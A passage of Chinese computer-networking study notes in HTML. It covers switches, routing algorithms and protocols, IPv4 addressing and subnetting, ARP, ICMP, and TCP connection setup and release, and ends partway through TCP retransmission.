&lt;p&gt;以太网交换机实质上是多端口网桥，它工作在数据链路层。以太网交换机的每个端口都直接与主机或集线器相连，并且一般都工作在全双工方式。当主机需要通信时，交换机能同时连通许多对的端口，使每一对相互通信的主机都能像独占通信媒体那样，进行无冲突地传输数据，通信完成后断开连接。&lt;/p&gt;
&lt;h4 id=&#34;各层设备的广播域冲突域及总结&#34;&gt;各层设备的广播域、冲突域及总结&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;设备名称&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;隔离冲突域&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;隔离广播域&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;集线器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;中继器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;交换机&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;网桥&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;❌&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;路由器&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;✔️&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;网络层&#34;&gt;网络层&lt;/h2&gt;
&lt;h3 id=&#34;网络层的功能&#34;&gt;网络层的功能&lt;/h3&gt;
&lt;h4 id=&#34;异构网络互连&#34;&gt;异构网络互连&lt;/h4&gt;
&lt;p&gt;将网络互联起来需要一些中间设备，根据中继系统所在的层次，有以下4种不同的中继系统。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;物理层：中继器或集线器&lt;/li&gt;
&lt;li&gt;数据链路层：网桥或交换机&lt;/li&gt;
&lt;li&gt;网络层：路由器&lt;/li&gt;
&lt;li&gt;网络层以上：网关&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;路由与转发&#34;&gt;路由与转发&lt;/h4&gt;
&lt;p&gt;路由器的主要功能包括路由选择（确定哪一条路径）与分组转发(当一个分组到达时所采用的动作)。根据所需性能要求，可以采用适当的路由算法来构造路由表进行路由选择。不仅如此，该路由表还会根据从各相邻路由器所得到的关于整个网络的拓扑变化情况，动态地改变所选择的路由，以便得到最佳路由&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;路由选择:根据路由算法确定一个进来的分组应该被传送到哪一条输出路线上。如果子网内部使用数据报，那么对每一个进来的分组都要重新选择路径。如果子网内部使用虚电路，那么只有当创建一个新的虚电路时，才需要确定路由路径&lt;/li&gt;
&lt;li&gt;分组转发:路由器根据转发表将用户的IP数据报从合适的端口转发出去&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意:路由表是根据路由选择算法得出的，而转发表是从路由表得出的&lt;/p&gt;
&lt;h4 id=&#34;拥塞控制&#34;&gt;拥塞控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;开环控制&lt;/li&gt;
&lt;li&gt;闭环控制&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;注意:拥塞控制和流量控制的关系密切，但二者之间也存在一些差异。拥塞控制必须确保通信子网能够传送待传送的数据，是一个全局性的问题，涉及所有主机、路由器以及导致网络传输能力下降的所有因素。而流量控制只与给定的发送端和接收端之间的点对点通信量有关，其任务是使发送端发送数据的速率不能快得让接收端来不及接收&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;路由算法&#34;&gt;路由算法&lt;/h3&gt;
&lt;h4 id=&#34;静态路由与动态路由&#34;&gt;静态路由与动态路由&lt;/h4&gt;
&lt;p&gt;静态路由特点是简单和开销小，但不能及时适应网络状态的变化&lt;br&gt;
动态路由特点是较好地适应网络状态的变化，分为两种基本类型：距离-向量路由算法和链路状态路由算法&lt;/p&gt;
&lt;h4 id=&#34;距离-向量路由算法&#34;&gt;距离-向量路由算法&lt;/h4&gt;
&lt;p&gt;在距离-向量路由算法中，所有的节点都定期地将它们整个路由选择表传送给所有与之直接相邻的节点。这种路由选择表包含每条路径的目的地（另一节点）和路径的代价（距离)&lt;/p&gt;
&lt;h4 id=&#34;链路状态路由算法&#34;&gt;链路状态路由算法&lt;/h4&gt;
&lt;p&gt;链路状态路由算法要求每个参与该算法的节点都有完全的网络拓扑信息，它们执行下述两项任务&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;主动测试所有邻接节点的状态，两个共享一条链接的节点是相邻节点，它们连接到同一条链路&lt;/li&gt;
&lt;li&gt;定期地将链路状态传播给所有其他节点（或称为路由节点)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;层次路由&#34;&gt;层次路由&lt;/h4&gt;
&lt;p&gt;因特网将整个互联网划分为许多较小的自治系统，每个自治系统有权自主地决定本系统内应采用何种路由选择协议&lt;br&gt;
因特网把路由选择协议分为两大类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个自治系统内部所使用的路由选择协议称为内部网关协议（IGP)，具体的协议有RIP和OSPF等&lt;/li&gt;
&lt;li&gt;自治系统之间使用的路由选择协议称为外部网关协议（EGP)，主要在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径，具体的协议有BGP&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ipv4&#34;&gt;IPv4&lt;/h3&gt;
&lt;h4 id=&#34;ipv4分组&#34;&gt;IPv4分组&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/ipv4.png&#34; alt=&#34;ip&#34; title=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ipv4地址&#34;&gt;IPv4地址&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;IPv4地址的分类&lt;br&gt;
A类地址：网络号为前面8位，第一位规定为0，每个A类网络上的最大主机是2&lt;sup&gt;24&lt;/sup&gt;-2&lt;br&gt;
B类地址：网络号为前面16位，前两位规定为10，每个B类网络上的最大主机是2&lt;sup&gt;16&lt;/sup&gt;-2&lt;br&gt;
C类地址：网络号为前面24位，前三位规定为110，每个C类网络上的最大主机是2&lt;sup&gt;8&lt;/sup&gt;-2&lt;/li&gt;
&lt;li&gt;6种特殊地址
&lt;img src=&#34;https://xuoneyuan.github.io/images/6-ipv4.png&#34; alt=&#34;ip&#34; title=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;nat&#34;&gt;NAT&lt;/h4&gt;
&lt;p&gt;NAT 就是将专用网内部使用的本地IP地址转换成有效的外部全球IP地址，使得整个专用网只需要一个全球IP地址就可以与因特网连通&lt;/p&gt;
&lt;h4 id=&#34;子网划分与子网掩码&#34;&gt;子网划分与子网掩码&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;子网划分&lt;br&gt;
划分子网的基本思路:从主机号借用若干个比特作为子网号，而主机号也就相应减少了若干个比特，网络号不变。于是三级的IP地址可记为&lt;br&gt;
IP地址::={&amp;lt;网络号&amp;gt;，&amp;lt;子网号&amp;gt;，&amp;lt;主机号&amp;gt;}&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;某网络的P地址空间为192.168.5.0/24，采用长子网划分，子网掩码为255.255.255.248，则该网络的最大子网个数为32，每个子网内的最大可分配地址个数为6&lt;br&gt;
解析：先将子网掩码写成二进制为11111111 11111111 11111111 11111000，可见IP地址空间192.168.5.0/24(本来主机位是8位）拿出了5位来划分子网，所以一共可以划分32个子网(这里使用的是 CIDR,所以全“0”、全“1”的子网不用去除);而主机位只有3位了，所以最大可分配的地址是23-2=6个(要去除全“0”、全“1”的地址)。&lt;/p&gt;&lt;/div&gt;

&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;子网掩码&lt;br&gt;
子网掩码是一个与P地址相对应的32位的二进制串，它由一串1和0组成。其中，1对应于P地址中的网络号和子网号，0对应于主机号。因为1对1进行与操作，结果为1;1对0进行与操作，结果为0&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;cidr&#34;&gt;CIDR&lt;/h4&gt;
&lt;p&gt;无分类编址（CIDR）是为解决IP地址耗尽而提出的一种措施&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CIDR消除了传统的A类、B类和C类地址以及划分子网的概念，因而可以更加有效地分配IPv4的地址空间。CIDR使用各种长度的“网络前缀”来代替分类地址中的网络号和子网号。于是，IP地址又从三级编址回到了两级编址，其地址格式为   IP地址::-{&amp;lt;网络前缀&amp;gt;，&amp;lt;主机号&amp;gt;}&lt;br&gt;
为了区分网络前缀，通常采用“斜线记法”(又称CIDR记法)，即IP地址/网络前缀所占位数&lt;/li&gt;
&lt;li&gt;将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以表示很多地址，这种地址的聚合常称为路由聚合(也称构成超网)，它使得路由表中的一个项目可以表示很多个原来传统分类地址的路由，因此可以缩短路由表，减小路由器之间选择信息的交换，从而提高网络性能&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;最长前缀匹配原则:在使用CIDR时，路由表中的每个项目由网络前缀和下一跳地址组成，这样就会导致查找路由表时可能会得到不止一个匹配结果。应当从匹配结果中选择具有最长网络前缀的路由，因为网络前缀越长，其地址块就越小，路由就越具体&lt;/p&gt;&lt;/div&gt;

&lt;h4 id=&#34;arp&#34;&gt;ARP&lt;/h4&gt;
&lt;p&gt;在每个主机中都有一个ARP高速缓存，里面存放的是所在局域网上的各主机和路由器的IP地址到硬件地址的映射表，ARP的职责就是动态地维护该表。&lt;/p&gt;
&lt;p&gt;当源主机欲向本局域网上的某个目标主机发送IP分组时，应先在其ARP高速缓存中查看有无目标主机的IP地址。如果有，就可查出其对应的硬件地址，再将此硬件地址写入MAC帧，然后通过局域网将该MAC帧发往此硬件地址。如果没有，则先通过广播ARP请求分组，在获得目标主机的ARP响应分组后，将目标主机的硬件地址写入ARP 高速缓存，建立目标主机的P地址到硬件地址的映射关系。&lt;/p&gt;
&lt;p&gt;ARP是解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题的。如果所要找的主机和源主机不在同一个局域网上，那么就要通过ARP找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络，剩下的工作就由下一个网络来做。&lt;/p&gt;
&lt;p&gt;ARP请求分组是广播送的，ARP响应分组是普通的单播，即从一个源地址发送到一个目的地址&lt;/p&gt;
&lt;h4 id=&#34;dhcp&#34;&gt;DHCP&lt;/h4&gt;
&lt;p&gt;动态主机配置协议（DHCP）常用于给主机动态地分配P地址&lt;/p&gt;
&lt;p&gt;DHCP是应用层协议，DHCP报文使用 UDP传输&lt;/p&gt;
&lt;h4 id=&#34;icmp&#34;&gt;ICMP&lt;/h4&gt;
&lt;p&gt;ICMP报文分为两种，即ICMP差错报告报文和ICMP询问报文&lt;/p&gt;
&lt;p&gt;ICMP差错报告报文的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;终点不可达。当路由器或主机不能交付数据报时，就向源点发送终点不可达报文。&lt;/li&gt;
&lt;li&gt;源站抑制。当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢。&lt;/li&gt;
&lt;li&gt;时间超过。当IP分组的TTL值被减为0后，路由器除了要丢弃该分组外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文。&lt;/li&gt;
&lt;li&gt;参数问题。当路由器或目的主机收到的数据报的首部中有字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文（现在一般都不发)。&lt;/li&gt;
&lt;li&gt;改变路由（重定向)。路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给其他的路由器（比当前更好的路由)。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ICMP询问报文的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有回送请求和回答报文&lt;/li&gt;
&lt;li&gt;时间戳请求和回答报文&lt;/li&gt;
&lt;li&gt;掩码地址请求和回答报文&lt;/li&gt;
&lt;li&gt;路由器询问和通告报文&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;路由协议&#34;&gt;路由协议&lt;/h3&gt;
&lt;h4 id=&#34;路由选择协议分类&#34;&gt;路由选择协议分类&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;内部网关协议(IGP)&lt;/li&gt;
&lt;li&gt;外部网关协议(EGP)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;rip&#34;&gt;RIP&lt;/h4&gt;
&lt;p&gt;RIP认为一个好的路由就是它通过的路由器的数目少，即“距离短”。RIP 允许一条路径最多只能包含15个路由器。“距离”的最大值为16时即相当于不可达。可见，RIP只适用于小型互联网。RIP不能在两个网络之间同时使用多条路由。RIP选择一个具有最少路由器的路由（最短路由)，哪怕还存在另一条高速（低时延）但路由器较多的路由&lt;/p&gt;
&lt;p&gt;RIP的三要点:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅和相邻路由器交换信息&lt;/li&gt;
&lt;li&gt;交换的信息是当前本路由器所知道的全部信息，即自己的路由表&lt;/li&gt;
&lt;li&gt;按固定的时间间隔（如每隔30s）交换路由信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;ospf&#34;&gt;OSPF&lt;/h4&gt;
&lt;p&gt;OSPF协议的三要点:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法&lt;/li&gt;
&lt;li&gt;发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息&lt;/li&gt;
&lt;li&gt;“链路状态”就是说明本路由器都和哪些路由器相邻以及该链路的“度量”(metric)。只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;bgp&#34;&gt;BGP&lt;/h4&gt;
&lt;p&gt;边界网关协议（BGP）是在不同自治系统的路由器之间交换路由信息的协议&lt;br&gt;
边界网关协议只能是力求寻找一条能够到达目的网络且比较好的路由（不能转圈)，而并非要寻找一条最佳路由&lt;/p&gt;
&lt;h4 id=&#34;总结&#34;&gt;总结&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;特性&lt;/th&gt;
&lt;th&gt;RIP&lt;/th&gt;
&lt;th&gt;OSPF&lt;/th&gt;
&lt;th&gt;BGP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;类型&lt;/td&gt;
&lt;td&gt;内部&lt;/td&gt;
&lt;td&gt;内部&lt;/td&gt;
&lt;td&gt;外部&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由算法&lt;/td&gt;
&lt;td&gt;距离-向量&lt;/td&gt;
&lt;td&gt;链路状态&lt;/td&gt;
&lt;td&gt;路径-向量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传递协议&lt;/td&gt;
&lt;td&gt;UDP&lt;/td&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;TCP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路径选择&lt;/td&gt;
&lt;td&gt;跳数最少&lt;/td&gt;
&lt;td&gt;代价最低&lt;/td&gt;
&lt;td&gt;较好，非最佳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;交换结点&lt;/td&gt;
&lt;td&gt;和本结点相邻的路由器&lt;/td&gt;
&lt;td&gt;网络中所有的路由器&lt;/td&gt;
&lt;td&gt;和本结点相邻的路由器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;交换内容&lt;/td&gt;
&lt;td&gt;当前本路由器知道的全部信息，即自己的路由表&lt;/td&gt;
&lt;td&gt;与本路由器相邻的所有路由器的链路状态&lt;/td&gt;
&lt;td&gt;首次：整个路由表；非首次：有变化的部分&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;网络层设备&#34;&gt;网络层设备&lt;/h3&gt;
&lt;h4 id=&#34;路由器的组成与功能&#34;&gt;路由器的组成与功能&lt;/h4&gt;
&lt;p&gt;路由器工作在网络层，实质上是一种多个输入端口和多个输出端口的专用计算机，其任务是连接不同的网络转发分组&lt;/p&gt;
&lt;p&gt;路由选择：确定数据报走那一条路径，即路由器根据不同的算法生成动态的路由表&lt;/p&gt;
&lt;p&gt;分组转发：路由器根据转发表将用户的IP数据从合适的端口报转发出去&lt;/p&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;为什么要划分子网？子网掩码的作用是什么？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由于因特网的每台主机都要分配一个唯一的P地址，所以分配的P地址很多，这将使路由器的路由表变得很大，进而影响了路由器在进行路由选择时的工作效率。解决这个问题的方法就是将一个大的网络划分为几个较小的网络,每个小的网络称为一个子网。&lt;/li&gt;
&lt;li&gt;当一个分组到达一个路由器时，路由器应该能够判断出P地址的网络号。子网掩码用来判断IP地址的哪一部分是网络号与子网号，哪一部分是主机号。为了完成这种分离，路由器将对IP地址和子网掩码进行“与”运算。&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;

&lt;h2 id=&#34;传输层&#34;&gt;传输层&lt;/h2&gt;
&lt;h3 id=&#34;传输层提供的服务&#34;&gt;传输层提供的服务&lt;/h3&gt;
&lt;h4 id=&#34;传输层的功能&#34;&gt;传输层的功能&lt;/h4&gt;
&lt;p&gt;传输层为两台主机提供了应用进程之间的通信，又称为端到端通信&lt;br&gt;
传输层的功能如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提供应用进程间的逻辑通信(网络层提供主机之间的逻辑通信)&lt;/li&gt;
&lt;li&gt;差错检测&lt;/li&gt;
&lt;li&gt;提供无连接或面向连接的服务&lt;/li&gt;
&lt;li&gt;复用和分用&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;协议&lt;/th&gt;
&lt;th&gt;TCP (Transmission Control Protocol)&lt;/th&gt;
&lt;th&gt;IP (Internet Protocol)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;层级&lt;/td&gt;
&lt;td&gt;传输层 (Transport Layer)&lt;/td&gt;
&lt;td&gt;网络层 (Network Layer)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;功能&lt;/td&gt;
&lt;td&gt;提供可靠的、面向连接的数据传输服务&lt;/td&gt;
&lt;td&gt;提供不可靠的、无连接的数据传输服务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据单位&lt;/td&gt;
&lt;td&gt;段 (Segment)&lt;/td&gt;
&lt;td&gt;数据报 (Datagram)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;控制机制&lt;/td&gt;
&lt;td&gt;流量控制、拥塞控制、错误检测和纠正&lt;/td&gt;
&lt;td&gt;无（由上层协议处理错误和控制）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;地址类型&lt;/td&gt;
&lt;td&gt;端口号 (Port Number)&lt;/td&gt;
&lt;td&gt;IP地址 (IP Address)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;适用场景&lt;/td&gt;
&lt;td&gt;需要可靠传输的应用，如网页浏览、文件传输&lt;/td&gt;
&lt;td&gt;所有通过网络层发送的数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;传输层寻址与端口&#34;&gt;传输层寻址与端口&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;端口的基本概念&lt;br&gt;
端口就是用来标识应用层的进程&lt;br&gt;
软件端口与硬件端口的区别:硬件端口是不同硬件设备进行交互的接口(如交换机和路由器的端口),而软件端口是应用层的各种协议进程与传输实体进行层间交互的一种地址&lt;/li&gt;
&lt;li&gt;端口号&lt;br&gt;
由于同一时刻一台主机上会有大量的网络应用进程在运行，所以需要有大量的端口号来标识不同的进程&lt;/li&gt;
&lt;li&gt;套接字&lt;br&gt;
套接字 = (主机IP地址，端口号)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;无连接服务与面向连接服务&#34;&gt;无连接服务与面向连接服务&lt;/h4&gt;
&lt;p&gt;传输层提供了两种类型的服务:无连接服务和面向连接服务，相应的实现分别是用户数据报协议（UDP）和传输控制协议（TCP)。当采用TCP时，传输层向上提供的是一条全双工的可靠的逻辑信道;当采用UDP时，传输层向上提供的是一条不可靠的逻辑信道。&lt;/p&gt;
&lt;p&gt;UDP的主要特点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;传送数据前无须建立连接，数据到达后也无须确认&lt;/li&gt;
&lt;li&gt;不可靠交付&lt;/li&gt;
&lt;li&gt;报文头部短，传输开销小，时延较短&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;TCP的主要特点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;面向连接，不提供广播或多播服务&lt;/li&gt;
&lt;li&gt;可靠交付&lt;/li&gt;
&lt;li&gt;报文段头部长，传输开销大&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;tcp&#34;&gt;TCP&lt;/h3&gt;
&lt;h4 id=&#34;tcp连接管理&#34;&gt;TCP连接管理&lt;/h4&gt;
&lt;p&gt;TCP传输连接的建立采用“三次握手”的方法&lt;/p&gt;
&lt;p&gt;第一步:客户机A的TCP向服务器B发出连接请求报文段，其首部中的同步位SYN=1(TCP 规定，SYN报文段不能携带数据，但要消耗一个序号)，并选择序号 seq=x，表明传送数据时的第一个数据字节的序号是x。&lt;/p&gt;
&lt;p&gt;第二步:服务器收到了数据报，并从SYN位为1知道这是一个建立连接的请求。如果同意，则发回确认。B在确认报文段中应使SYN=1，ACK=1，其确认号ack=x+1，自己选择的序号seq=y。注意，此时该报文段也不能携带数据(助记:因为有SYN=1，所以不能带数据)。&lt;/p&gt;
&lt;p&gt;第三步:A收到此报文段后向B给出确认，其ACK=1，确认号ack=y+1。A的TCP通知上层应用进程，连接已经建立。B的TCP收到主机A的确认后，也通知其上层应用进程，此时TCP连接已经建立，ACK报文可以携带数据（没有SYN 字段)，如果不携带数据则不消耗序号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/tcp3.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;p&gt;释放传输连接&lt;br&gt;
第一步:数据传输结束后，通信双方都可释放连接。现在A的应用进程先向其TCP发出连接释放报文段，并停止再发送数据，主动关闭TCP连接。A将连接释放报文段首部的FIN置1，其序号 seq=u，等待B的确认。这里要注意，因为TCP是双工的，也就是说，可以想象一对TCP连接上有两条数据通路。当发送FIN报文时，发送FIN的一端就不能发送数据，也就是关闭了其中一条数据通路，但是对方还是可以发送数据的。&lt;/p&gt;
&lt;p&gt;第二步:如图5-9所示，B发出确认，确认号ack=u+1，而这个报文段自己的序号seq=v。TCP服务器进程通知高层应用进程。从A到B这个方向的连接就释放了，TCP连接处于半关闭状态。B若发送数据，则A仍要接收。&lt;/p&gt;
&lt;p&gt;第三步:若B已经没有要向A发送的数据，其应用进程就通知TCP释放连接。&lt;/p&gt;
&lt;p&gt;第四步:A收到连接释放报文段后，必须发出确认。在确认报文段中，ACK=1，确认号ack=w+1，自己的序号seq=u+1。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/tcp4.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;建立连接&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;SYN=1, seq=x&lt;/li&gt;
&lt;li&gt;SYN=1,ACK=1,seq=y,ack=x+1&lt;/li&gt;
&lt;li&gt;ACK=1,seq=x+1,ack=y+1&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;释放连接&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;FIN=1,seq=u&lt;/li&gt;
&lt;li&gt;ACK=1,seq=v,ack=u+1&lt;/li&gt;
&lt;li&gt;FIN=1,ACK=1,seq=w,ack=u+1&lt;/li&gt;
&lt;li&gt;ACK=1,seq=u+1,ack=w+1&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

&lt;h4 id=&#34;tcp可靠传输&#34;&gt;TCP可靠传输&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;TCP数据编号与确认&lt;br&gt;
TCP是面向字节的。TCP将所要传送的报文看成是字节组成的数据流，并使每一个字节对应于一个序号。在连接建立时，双方要商定初始序号。TCP每次发送的报文段的首部中的序号字段数值表示该报文段中的数据部分的第一个字节的序号。&lt;br&gt;
TCP 的确认是对接收到的数据的最高序号表示确认。接收端返回的确认号是已收到的数据的最高序号加1。因此，确认号表示接收端期望下次收到的数据中的第一个数据字节的序号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TCP的重传机制
TCP每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到了规定时间还没有收到确认，那么就要重传该报文段。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;RTT=(1-α)×(旧的 RTT)+α×(新的往返时延样本)&lt;/p&gt;
